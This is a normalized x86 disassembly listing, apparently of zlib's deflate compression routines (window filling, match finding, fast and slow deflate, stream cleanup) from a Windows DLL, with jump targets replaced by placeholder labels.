xor ebx ebx
jmp r-xdata
mov eax [ edi + 0x30 ]
shr eax 0x10
push eax
push esi
call sub_1000a4ee
mov eax [ edi + 0x30 ]
and eax 0xffff
push eax
push esi
call sub_1000a4ee
add esp 0x10
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x14 ]
mov dl [ edi + 0x30 ]
mov [ eax + ecx ] dl
inc [ esi + 0x14 ]
mov ecx [ edi + 0x30 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
shr ecx 0x8
mov [ edx + eax ] cl
inc [ esi + 0x14 ]
mov ecx [ edi + 0x30 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
shr ecx 0x10
mov [ edx + eax ] cl
inc [ esi + 0x14 ]
mov ecx [ edi + 0x30 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
shr ecx 0x18
mov [ edx + eax ] cl
inc [ esi + 0x14 ]
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
mov dl [ edi + 0x8 ]
mov [ ecx + eax ] dl
inc [ esi + 0x14 ]
mov ecx [ edi + 0x8 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
shr ecx 0x8
mov [ edx + eax ] cl
inc [ esi + 0x14 ]
mov ecx [ edi + 0x8 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
shr ecx 0x10
mov [ edx + eax ] cl
inc [ esi + 0x14 ]
mov ecx [ edi + 0x8 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
shr ecx 0x18
mov [ edx + eax ] cl
inc [ esi + 0x14 ]
jmp r-xdata
push edi
call sub_1000a518
cmp [ edi + 0x10 ] ebx
pop ecx
jne r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ esi + 0x44 ]
mov [ ecx + eax * 2 - 0x2 ] bx
mov eax [ esi + 0x4c ]
lea eax [ eax + eax - 0x2 ]
push eax
push ebx
push [ esi + 0x44 ]
call memset
add esp 0xc
xor eax eax
cmp [ esi + 0x14 ] eax
sete al
jmp r-xdata
neg eax
mov [ esi + 0x18 ] eax
push edi
call sub_1000a518
mov eax [ esi + 0x18 ]
pop ecx
test eax eax
jle r-xdata
sub_1000a4ee
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
push esi
push edi
mov esi [ eax + 0x8 ]
mov edi [ eax + 0x14 ]
mov ecx edx
shr ecx 0x8
mov [ esi + edi ] cl
inc [ eax + 0x14 ]
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x8 ]
pop edi
mov [ esi + ecx ] dl
inc [ eax + 0x14 ]
pop esi
retn
sub_1000a518
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x1c ]
mov ecx [ esi + 0x10 ]
mov edi [ eax + 0x14 ]
cmp edi ecx
jbe r-xdata
test edi edi
je r-xdata
mov edi ecx
pop edi
pop esi
retn
push edi
push [ eax + 0x10 ]
push [ esi + 0xc ]
call memcpy
mov eax [ esi + 0x1c ]
add [ esi + 0xc ] edi
add esp 0xc
add [ eax + 0x10 ] edi
mov eax [ esi + 0x1c ]
add [ esi + 0x14 ] edi
sub [ esi + 0x10 ] edi
sub [ eax + 0x14 ] edi
mov esi [ esi + 0x1c ]
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
sub_1000a567
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
je r-xdata
push 0xfffffffe
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov edi [ eax + 0x4 ]
cmp edi 0x2a
je r-xdata
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
cmp edi 0x45
je r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x28 ]
call [ esi + 0x24 ]
pop ecx
pop ecx
cmp edi 0x49
je r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x40 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x28 ]
call [ esi + 0x24 ]
pop ecx
pop ecx
cmp edi 0x5b
je r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x38 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x28 ]
call [ esi + 0x24 ]
pop ecx
pop ecx
cmp edi 0x67
je r-xdata
push [ esi + 0x1c ]
push [ esi + 0x28 ]
call [ esi + 0x24 ]
and [ esi + 0x1c ] 0x0
pop ecx
cmp edi 0x71
pop ecx
jne r-xdata
push eax
push [ esi + 0x28 ]
call [ esi + 0x24 ]
pop ecx
pop ecx
cmp edi 0x71
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffffd
jmp r-xdata
cmp edi 0x29a
jne r-xdata
pop edi
pop esi
retn
pop eax
sub_1000a614
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
mov eax [ esi + 0x2c ]
mov ecx [ esi + 0x44 ]
shl eax 0x1
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x4c ]
mov [ ecx + eax * 2 - 0x2 ] di
mov eax [ esi + 0x4c ]
lea eax [ eax + eax - 0x2 ]
push eax
push edi
push [ esi + 0x44 ]
call memset
mov eax [ esi + 0x84 ]
add esp 0xc
lea eax [ eax + eax * 2 ]
push 0x2
shl eax 0x2
movzx ecx [ eax + r--data ]
mov [ esi + 0x80 ] ecx
movzx ecx [ eax + r--data ]
mov [ esi + 0x8c ] ecx
movzx ecx [ eax + r--data ]
mov [ esi + 0x90 ] ecx
movzx eax [ eax + r--data ]
mov [ esi + 0x7c ] eax
pop eax
mov [ esi + 0x6c ] edi
mov [ esi + 0x5c ] edi
mov [ esi + 0x74 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x78 ] eax
mov [ esi + 0x60 ] eax
pop edi
pop esi
retn
sub_1000a69b
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax 0xffff
push edi
mov ebx eax
mov ecx [ esi + 0xc ]
add ecx 0xfffffffb
cmp ecx eax
jae r-xdata
xor edi edi
mov ebx ecx
mov edx [ esi + 0x5c ]
add [ esi + 0x6c ] eax
mov ecx [ esi + 0x6c ]
mov [ esi + 0x74 ] edi
lea eax [ edx + ebx ]
je r-xdata
push esi
call sub_1000a7da
mov eax [ esi + 0x74 ]
pop ecx
cmp eax edi
jne r-xdata
sub ecx eax
cmp edx edi
mov [ esi + 0x74 ] ecx
mov [ esi + 0x6c ] eax
jl r-xdata
cmp ecx eax
jb r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
xor ecx ecx
mov ecx [ esi + 0x38 ]
add ecx edx
jmp r-xdata
mov ecx [ esi + 0x5c ]
mov edx [ esi + 0x6c ]
mov eax [ esi + 0x2c ]
sub edx ecx
sub eax 0x106
cmp edx eax
jb r-xdata
xor eax eax
cmp eax edi
je r-xdata
sub eax edx
push edi
push eax
push ecx
push esi
call sub_1000bba3
mov eax [ esi + 0x6c ]
push [ esi ]
mov [ esi + 0x5c ] eax
call sub_1000a518
mov eax [ esi ]
add esp 0x14
cmp [ eax + 0x10 ] edi
je r-xdata
mov eax [ esi + 0x74 ]
cmp eax 0x1
ja r-xdata
cmp ecx edi
jl r-xdata
mov ecx [ esi + 0x5c ]
cmp ecx edi
jl r-xdata
xor eax eax
mov eax [ esi + 0x38 ]
add eax ecx
jmp r-xdata
xor eax eax
mov eax [ esi + 0x38 ]
add eax ecx
jmp r-xdata
jmp r-xdata
push edi
push edx
push eax
push esi
call sub_1000bba3
mov eax [ esi + 0x6c ]
push [ esi ]
mov [ esi + 0x5c ] eax
call sub_1000a518
mov eax [ esi ]
add esp 0x14
cmp [ eax + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
inc eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x4
jne r-xdata
xor edx edx
cmp [ ebp + 0xc ] 0x4
sete dl
push edx
mov edx [ esi + 0x6c ]
sub edx ecx
push edx
push eax
push esi
call sub_1000bba3
mov eax [ esi + 0x6c ]
push [ esi ]
mov [ esi + 0x5c ] eax
call sub_1000a518
mov eax [ esi ]
add esp 0x14
cmp [ eax + 0x10 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x2
pop eax
jmp r-xdata
sub_1000a7da
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x2c ]
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ esi + 0x38 ]
push edi
lea ecx [ eax + edi ]
push ecx
push eax
call memcpy
mov eax [ esi + 0x4c ]
mov ecx [ esi + 0x44 ]
sub [ esi + 0x70 ] edi
sub [ esi + 0x6c ] edi
add esp 0xc
sub [ esi + 0x5c ] edi
mov [ ebp + 0x8 ] eax
lea eax [ ecx + eax * 2 ]
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ esi + 0x74 ]
push ebx
add ecx [ esi + 0x6c ]
add ecx [ esi + 0x38 ]
push ecx
push eax
call sub_1000a8c2
add [ esi + 0x74 ] eax
mov ebx [ esi + 0x74 ]
add esp 0xc
cmp ebx 0x3
jb r-xdata
dec eax
dec eax
movzx ecx [ eax ]
mov edx ecx
sub edx edi
cmp ecx edi
sbb ecx ecx
not ecx
and ecx edx
dec [ ebp + 0x8 ]
mov [ eax ] cx
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebp + 0x8 ] edi
lea eax [ eax + edi * 2 ]
cmp ebx 0x106
jae r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x38 ]
lea edx [ eax + ecx ]
mov ecx [ esi + 0x58 ]
movzx eax [ edx ]
mov [ esi + 0x48 ] eax
shl eax cl
movzx ecx [ edx + 0x1 ]
xor eax ecx
and eax [ esi + 0x54 ]
mov [ esi + 0x48 ] eax
dec eax
dec eax
movzx ecx [ eax ]
mov edx ecx
sub edx edi
cmp ecx edi
sbb ecx ecx
not ecx
and ecx edx
dec [ ebp + 0x8 ]
mov [ eax ] cx
jne r-xdata
add ebx edi
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ebx [ esi + 0x3c ]
mov ecx [ esi + 0x2c ]
sub ebx [ esi + 0x74 ]
mov eax [ esi + 0x6c ]
lea ecx [ edi + ecx - 0x106 ]
sub ebx eax
cmp eax ecx
jb r-xdata
sub_1000a8c2
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
mov edi eax
cmp edi [ esp + 0x14 ]
jbe r-xdata
test edi edi
jne r-xdata
mov edi [ esp + 0x14 ]
sub eax edi
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x18 ]
cmp eax 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x2
jne r-xdata
push edi
push [ esi ]
push [ esi + 0x30 ]
call sub_1000b5e3
jmp r-xdata
pop edi
pop esi
retn
push edi
push [ esi ]
push [ esp + 0x18 ]
call memcpy
add [ esi ] edi
add esp 0xc
add [ esi + 0x8 ] edi
mov eax edi
push edi
push [ esi ]
push [ esi + 0x30 ]
call sub_1000b339
add esp 0xc
mov [ esi + 0x30 ] eax
sub_1000a92b
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
xor ebp ebp
mov ebx 0x106
push 0x3
pop edi
cmp eax edi
jb r-xdata
push esi
call sub_1000a7da
mov eax [ esi + 0x74 ]
pop ecx
cmp eax ebx
jae r-xdata
test ebp ebp
je r-xdata
mov eax [ esi + 0x48 ]
mov ecx [ esi + 0x58 ]
mov edx [ esi + 0x6c ]
mov ebp [ esi + 0x34 ]
shl eax cl
mov ecx [ esi + 0x38 ]
and ebp edx
movzx ecx [ ecx + edx + 0x2 ]
mov edx [ esi + 0x40 ]
xor eax ecx
and eax [ esi + 0x54 ]
mov ecx [ esi + 0x44 ]
mov [ esi + 0x48 ] eax
mov ax [ ecx + eax * 2 ]
mov [ edx + ebp * 2 ] ax
mov eax [ esi + 0x6c ]
and eax [ esi + 0x34 ]
mov ecx [ esi + 0x40 ]
mov dx [ esi + 0x6c ]
movzx ebp [ ecx + eax * 2 ]
mov eax [ esi + 0x48 ]
mov ecx [ esi + 0x44 ]
mov [ ecx + eax * 2 ] dx
test eax eax
je r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
cmp [ esi + 0x60 ] edi
jb r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x2c ]
sub eax ebp
sub ecx ebx
cmp eax ecx
ja r-xdata
mov ecx [ esi + 0x5c ]
test ecx ecx
jl r-xdata
xor eax eax
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x38 ]
mov edx [ esi + 0x16a4 ]
mov al [ eax + ecx ]
mov ecx [ esi + 0x16a0 ]
and [ edx + ecx * 2 ] 0x0
mov ecx [ esi + 0x1698 ]
mov edx [ esi + 0x16a0 ]
mov [ ecx + edx ] al
inc [ esi + 0x16a0 ]
movzx eax al
inc [ esi + eax * 4 + 0x94 ]
xor ecx ecx
lea eax [ esi + eax * 4 + 0x94 ]
mov eax [ esi + 0x169c ]
dec eax
cmp [ esi + 0x16a0 ] eax
sete cl
dec [ esi + 0x74 ]
mov edi ecx
mov ax [ esi + 0x6c ]
mov edx [ esi + 0x16a0 ]
sub ax [ esi + 0x70 ]
mov edi [ esi + 0x16a4 ]
mov cl [ esi + 0x60 ]
mov [ edi + edx * 2 ] ax
mov edx [ esi + 0x1698 ]
mov edi [ esi + 0x16a0 ]
sub cl 0x3
add eax 0xffff
mov [ edx + edi ] cl
inc [ esi + 0x16a0 ]
movzx ecx cl
movzx ecx [ ecx + r--data ]
inc [ esi + ecx * 4 + 0x498 ]
cmp ax 0x100
lea ecx [ esi + ecx * 4 + 0x498 ]
movzx eax ax
jae r-xdata
mov ecx [ esi + 0x88 ]
cmp ecx 0x2
je r-xdata
xor eax eax
mov eax [ esi + 0x38 ]
add eax ecx
jmp r-xdata
mov eax [ esi + 0x74 ]
cmp eax ebx
jae r-xdata
mov ecx [ esi + 0x5c ]
test ecx ecx
jl r-xdata
shr eax 0x7
movzx eax [ eax + r--data ]
movzx eax [ eax + r--data ]
jmp r-xdata
cmp ecx edi
jne r-xdata
cmp ecx edi
je r-xdata
xor eax eax
cmp edi 0x4
setne al
dec eax
and eax 0x2
inc eax
jmp r-xdata
cmp edi 0x4
jne r-xdata
mov edi [ esp + 0x18 ]
xor edx edx
cmp edi 0x4
sete dl
push edx
mov edx [ esi + 0x6c ]
sub edx ecx
push edx
push eax
push esi
call sub_1000bba3
mov eax [ esi + 0x6c ]
push [ esi ]
mov [ esi + 0x5c ] eax
call sub_1000a518
mov ecx [ esi ]
xor eax eax
add esp 0x14
cmp [ ecx + 0x10 ] eax
jne r-xdata
xor eax eax
mov eax ecx
add eax [ esi + 0x38 ]
jmp r-xdata
add [ esi + 0x6c ] eax
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x38 ]
and [ esi + 0x60 ] 0x0
lea edx [ eax + ecx ]
mov ecx [ esi + 0x58 ]
movzx eax [ edx ]
mov [ esi + 0x48 ] eax
shl eax cl
movzx ecx [ edx + 0x1 ]
xor eax ecx
and eax [ esi + 0x54 ]
mov [ esi + 0x48 ] eax
jmp r-xdata
cmp ecx 0x3
jb r-xdata
inc [ esi + eax * 4 + 0x988 ]
lea eax [ esi + eax * 4 + 0x988 ]
mov eax [ esi + 0x169c ]
xor ecx ecx
dec eax
cmp [ esi + 0x16a0 ] eax
mov eax [ esi + 0x60 ]
sete cl
sub [ esi + 0x74 ] eax
cmp eax [ esi + 0x80 ]
mov edi ecx
mov ecx [ esi + 0x74 ]
ja r-xdata
cmp eax 0x1
jne r-xdata
push ebp
push esi
call sub_1000ac25
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x2
pop eax
jmp r-xdata
jmp r-xdata
mov edx [ esi + 0x6c ]
push 0x0
sub edx ecx
push edx
push eax
push esi
call sub_1000bba3
mov eax [ esi + 0x6c ]
push [ esi ]
mov [ esi + 0x5c ] eax
call sub_1000a518
mov eax [ esi ]
add esp 0x14
cmp [ eax + 0x10 ] 0x0
je r-xdata
test edi edi
je r-xdata
dec eax
mov [ esi + 0x60 ] eax
push ebp
push esi
call sub_1000ad7e
pop ecx
mov [ esi + 0x60 ] eax
pop ecx
inc [ esi + 0x6c ]
mov edx [ esi + 0x6c ]
mov eax [ esi + 0x38 ]
mov ebp [ esi + 0x48 ]
mov ecx [ esi + 0x58 ]
movzx eax [ edx + eax + 0x2 ]
shl ebp cl
mov ecx [ esi + 0x44 ]
xor eax ebp
mov ebp [ esi + 0x34 ]
and eax [ esi + 0x54 ]
and ebp edx
mov edx [ esi + 0x40 ]
mov [ esi + 0x48 ] eax
mov ax [ ecx + eax * 2 ]
mov [ edx + ebp * 2 ] ax
mov eax [ esi + 0x6c ]
and eax [ esi + 0x34 ]
mov ecx [ esi + 0x40 ]
mov dx [ esi + 0x6c ]
movzx ebp [ ecx + eax * 2 ]
mov eax [ esi + 0x48 ]
mov ecx [ esi + 0x44 ]
mov [ ecx + eax * 2 ] dx
dec [ esi + 0x60 ]
jne r-xdata
jmp r-xdata
inc [ esi + 0x6c ]
sub_1000ac25
push ebp
mov ebp esp
sub esp 0x18
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov eax [ ecx + 0x7c ]
mov esi [ ecx + 0x6c ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x90 ]
mov edi [ ecx + 0x78 ]
mov [ ebp - 0xc ] eax
mov eax [ ecx + 0x2c ]
add edx esi
lea ebx [ eax - 0x106 ]
cmp esi ebx
jbe r-xdata
and [ ebp - 0x10 ] 0x0
sub esi eax
add esi 0x106
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov eax [ ecx + 0x74 ]
cmp [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] eax
jbe r-xdata
shr [ ebp - 0x8 ] 0x2
cmp edi [ ecx + 0x8c ]
lea eax [ edx + 0x102 ]
mov [ ebp - 0x14 ] eax
mov al [ edi + edx - 0x1 ]
mov [ ebp + 0xb ] al
mov al [ edi + edx ]
mov [ ebp - 0x1 ] al
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov esi [ ecx + 0x34 ]
mov eax [ ecx + 0x40 ]
and esi [ ebp + 0xc ]
movzx eax [ eax + esi * 2 ]
cmp eax [ ebp - 0x10 ]
mov [ ebp + 0xc ] eax
jbe r-xdata
mov al [ ebp + 0xb ]
cmp [ esi + edi - 0x1 ] al
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp edi eax
ja r-xdata
dec [ ebp - 0x8 ]
jne r-xdata
mov al [ esi ]
cmp al [ edx ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax edi
mov esi [ ecx + 0x38 ]
add esi eax
mov al [ ebp - 0x1 ]
cmp [ esi + edi ] al
jne r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al [ edx + 0x1 ]
jne r-xdata
mov ebx [ ebp - 0x14 ]
inc edx
inc edx
inc esi
mov eax edx
lea edx [ ebx - 0x102 ]
sub eax ebx
add eax 0x102
cmp eax edi
jle r-xdata
mov al [ edx + 0x1 ]
inc edx
inc esi
cmp al [ esi ]
jne r-xdata
mov esi [ ebp + 0xc ]
cmp eax [ ebp - 0xc ]
mov [ ecx + 0x70 ] esi
mov edi eax
jge r-xdata
mov al [ edx + 0x1 ]
inc edx
inc esi
cmp al [ esi ]
jne r-xdata
lea esi [ eax + edx ]
mov al [ eax + edx - 0x1 ]
mov [ ebp + 0xb ] al
mov al [ esi ]
mov [ ebp - 0x1 ] al
mov al [ edx + 0x1 ]
inc edx
inc esi
cmp al [ esi ]
jne r-xdata
mov al [ edx + 0x1 ]
inc edx
inc esi
cmp al [ esi ]
jne r-xdata
mov al [ edx + 0x1 ]
inc edx
inc esi
cmp al [ esi ]
jne r-xdata
mov al [ edx + 0x1 ]
inc edx
inc esi
cmp al [ esi ]
jne r-xdata
mov al [ edx + 0x1 ]
inc edx
inc esi
cmp al [ esi ]
jne r-xdata
cmp edx ebx
jb r-xdata
mov al [ edx + 0x1 ]
inc edx
inc esi
cmp al [ esi ]
jne r-xdata
sub_1000ad7e
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov ecx [ esi + 0x38 ]
mov eax [ esi + 0x6c ]
add eax ecx
add ecx edi
mov bl [ ecx ]
lea edx [ eax + 0x102 ]
cmp bl [ eax ]
jne r-xdata
push 0x2
pop eax
mov bl [ ecx + 0x1 ]
cmp bl [ eax + 0x1 ]
jne r-xdata
inc eax
inc eax
inc ecx
inc ecx
sub eax edx
add eax 0x102
cmp eax 0x3
jl r-xdata
mov bl [ eax + 0x1 ]
inc eax
inc ecx
cmp bl [ ecx ]
jne r-xdata
mov [ esi + 0x70 ] edi
mov esi [ esi + 0x74 ]
cmp eax esi
jbe r-xdata
mov bl [ eax + 0x1 ]
inc eax
inc ecx
cmp bl [ ecx ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
jmp r-xdata
mov bl [ eax + 0x1 ]
inc eax
inc ecx
cmp bl [ ecx ]
jne r-xdata
mov bl [ eax + 0x1 ]
inc eax
inc ecx
cmp bl [ ecx ]
jne r-xdata
mov bl [ eax + 0x1 ]
inc eax
inc ecx
cmp bl [ ecx ]
jne r-xdata
mov bl [ eax + 0x1 ]
inc eax
inc ecx
cmp bl [ ecx ]
jne r-xdata
mov bl [ eax + 0x1 ]
inc eax
inc ecx
cmp bl [ ecx ]
jne r-xdata
cmp eax edx
jb r-xdata
mov bl [ eax + 0x1 ]
inc eax
inc ecx
cmp bl [ ecx ]
jne r-xdata
sub_1000ae18
push ecx
push ebx
push ebp
xor ebx ebx
push esi
mov esi [ esp + 0x14 ]
push edi
mov [ esp + 0x10 ] ebx
cmp eax 0x3
jb r-xdata
push esi
call sub_1000a7da
mov eax [ esi + 0x74 ]
pop ecx
cmp eax edi
jae r-xdata
mov eax [ esi + 0x60 ]
mov edx [ esp + 0x10 ]
push 0x2
mov [ esi + 0x78 ] eax
mov eax [ esi + 0x70 ]
pop ebp
cmp edx ebx
mov [ esi + 0x64 ] eax
mov [ esi + 0x60 ] ebp
je r-xdata
mov eax [ esi + 0x48 ]
mov ecx [ esi + 0x58 ]
mov edx [ esi + 0x6c ]
mov ebp [ esi + 0x34 ]
shl eax cl
mov ecx [ esi + 0x38 ]
and ebp edx
movzx ecx [ ecx + edx + 0x2 ]
mov edx [ esi + 0x40 ]
xor eax ecx
and eax [ esi + 0x54 ]
mov ecx [ esi + 0x44 ]
mov [ esi + 0x48 ] eax
mov ax [ ecx + eax * 2 ]
mov [ edx + ebp * 2 ] ax
mov eax [ esi + 0x6c ]
and eax [ esi + 0x34 ]
mov ecx [ esi + 0x40 ]
mov dx [ esi + 0x6c ]
movzx eax [ ecx + eax * 2 ]
mov ecx [ esi + 0x44 ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ecx + eax * 2 ] dx
cmp eax ebx
je r-xdata
cmp [ esp + 0x1c ] ebx
je r-xdata
mov eax [ esi + 0x78 ]
cmp eax 0x3
jb r-xdata
mov eax [ esi + 0x78 ]
cmp eax [ esi + 0x80 ]
jae r-xdata
cmp [ esi + 0x68 ] ebx
je r-xdata
xor eax eax
cmp [ esi + 0x68 ] ebx
je r-xdata
cmp [ esi + 0x60 ] eax
ja r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x2c ]
sub eax edx
sub ecx edi
cmp eax ecx
ja r-xdata
mov ecx [ esi + 0x5c ]
cmp ecx ebx
jl r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x38 ]
mov edx [ esi + 0x16a0 ]
mov edi [ esi + 0x16a4 ]
mov cl [ eax + ecx - 0x1 ]
lea eax [ esi + 0x16a0 ]
mov [ edi + edx * 2 ] bx
mov edx [ esi + 0x1698 ]
mov edi [ eax ]
mov [ edx + edi ] cl
inc [ eax ]
movzx eax cl
inc [ esi + eax * 4 + 0x94 ]
mov [ esi + 0x68 ] ebx
lea eax [ esi + eax * 4 + 0x94 ]
inc [ esi + 0x6c ]
dec [ esi + 0x74 ]
mov [ esi + 0x68 ] 0x1
jmp r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x38 ]
mov edx [ esi + 0x16a4 ]
mov al [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x16a0 ]
mov [ edx + ecx * 2 ] bx
mov ecx [ esi + 0x1698 ]
mov edx [ esi + 0x16a0 ]
mov [ ecx + edx ] al
inc [ esi + 0x16a0 ]
movzx eax al
inc [ esi + eax * 4 + 0x94 ]
lea eax [ esi + eax * 4 + 0x94 ]
mov eax [ esi + 0x169c ]
dec eax
cmp [ esi + 0x16a0 ] eax
jne r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ esi + 0x74 ]
mov edx [ esi + 0x16a0 ]
mov ebp [ esi + 0x16a4 ]
lea edi [ eax + ecx - 0x3 ]
mov cl [ esi + 0x78 ]
sub ax [ esi + 0x64 ]
sub cl 0x3
dec eax
mov [ ebp + edx * 2 ] ax
mov edx [ esi + 0x1698 ]
mov ebp [ esi + 0x16a0 ]
add eax 0xffff
mov [ edx + ebp ] cl
inc [ esi + 0x16a0 ]
movzx ecx cl
movzx ecx [ ecx + r--data ]
inc [ esi + ecx * 4 + 0x498 ]
cmp ax 0x100
lea ecx [ esi + ecx * 4 + 0x498 ]
movzx eax ax
jae r-xdata
mov ecx [ esi + 0x88 ]
cmp ecx ebp
je r-xdata
xor eax eax
mov eax [ esi + 0x38 ]
add eax ecx
jmp r-xdata
mov eax [ esi + 0x74 ]
mov edi 0x106
cmp eax edi
jae r-xdata
inc [ esi + 0x6c ]
dec [ esi + 0x74 ]
mov ecx [ esi + 0x5c ]
cmp ecx ebx
jl r-xdata
shr eax 0x7
movzx eax [ eax + r--data ]
movzx eax [ eax + r--data ]
jmp r-xdata
cmp ecx 0x3
jne r-xdata
cmp ecx 0x3
je r-xdata
xor eax eax
cmp [ esp + 0x1c ] 0x4
setne al
dec eax
and eax 0x2
inc eax
jmp r-xdata
cmp [ esp + 0x1c ] 0x4
jne r-xdata
xor edx edx
cmp [ esp + 0x1c ] 0x4
sete dl
push edx
mov edx [ esi + 0x6c ]
sub edx ecx
push edx
push eax
push esi
call sub_1000bba3
mov eax [ esi + 0x6c ]
push [ esi ]
mov [ esi + 0x5c ] eax
call sub_1000a518
mov eax [ esi ]
add esp 0x14
cmp [ eax + 0x10 ] ebx
jne r-xdata
jmp r-xdata
xor eax eax
mov eax ecx
add eax [ esi + 0x38 ]
jmp r-xdata
dec [ esi + 0x78 ]
jne r-xdata
mov eax [ esi + 0x48 ]
mov ecx [ esi + 0x58 ]
shl eax cl
mov ecx [ esi + 0x38 ]
mov ebx [ esi + 0x34 ]
and ebx edx
movzx ecx [ ecx + edx + 0x2 ]
mov edx [ esi + 0x40 ]
xor eax ecx
and eax [ esi + 0x54 ]
mov ecx [ esi + 0x44 ]
mov [ esi + 0x48 ] eax
mov ax [ ecx + eax * 2 ]
mov [ edx + ebx * 2 ] ax
mov eax [ esi + 0x6c ]
and eax [ esi + 0x34 ]
mov ecx [ esi + 0x40 ]
mov dx [ esi + 0x6c ]
xor ebx ebx
movzx eax [ ecx + eax * 2 ]
mov ecx [ esi + 0x44 ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ecx + eax * 2 ] dx
inc [ esi + eax * 4 + 0x988 ]
lea eax [ esi + eax * 4 + 0x988 ]
mov eax [ esi + 0x169c ]
xor ecx ecx
dec eax
push 0x1
cmp [ esi + 0x16a0 ] eax
mov eax [ esi + 0x78 ]
sete cl
mov ebp ecx
pop ecx
sub ecx eax
add [ esi + 0x74 ] ecx
add eax 0xfffffffe
mov [ esi + 0x78 ] eax
mov eax [ esi + 0x60 ]
cmp eax 0x5
ja r-xdata
cmp eax 0x1
jne r-xdata
push edx
push esi
call sub_1000ac25
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push 0x2
pop eax
jmp r-xdata
mov edx [ esi + 0x6c ]
push ebx
sub edx ecx
push edx
push eax
push esi
call sub_1000bba3
mov eax [ esi + 0x6c ]
push [ esi ]
mov [ esi + 0x5c ] eax
call sub_1000a518
add esp 0x14
inc [ esi + 0x6c ]
mov edx [ esi + 0x6c ]
cmp edx edi
ja r-xdata
inc [ esi + 0x6c ]
mov eax [ esi + 0x6c ]
cmp ebp ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x60 ] 0x2
je r-xdata
cmp [ esi + 0x88 ] 0x1
je r-xdata
push edx
push esi
call sub_1000ad7e
pop ecx
mov [ esi + 0x60 ] eax
pop ecx
mov edx [ esi + 0x5c ]
cmp edx ebx
jl r-xdata
mov [ esi + 0x60 ] ebp
cmp eax 0x3
jne r-xdata
xor ecx ecx
mov ecx [ esi + 0x38 ]
add ecx edx
jmp r-xdata
mov eax [ esi + 0x6c ]
sub eax [ esi + 0x70 ]
cmp eax 0x1000
jbe r-xdata
mov eax [ esi ]
cmp [ eax + 0x10 ] ebx
je r-xdata
sub eax edx
push ebx
push eax
push ecx
push esi
call sub_1000bba3
mov eax [ esi + 0x6c ]
push [ esi ]
mov [ esi + 0x5c ] eax
call sub_1000a518
add esp 0x14
jmp r-xdata
sub_1000b1e7
mov ecx [ esp + 0x4 ]
xor edx edx
cmp ecx edx
je r-xdata
push 0xfffffffe
pop eax
retn
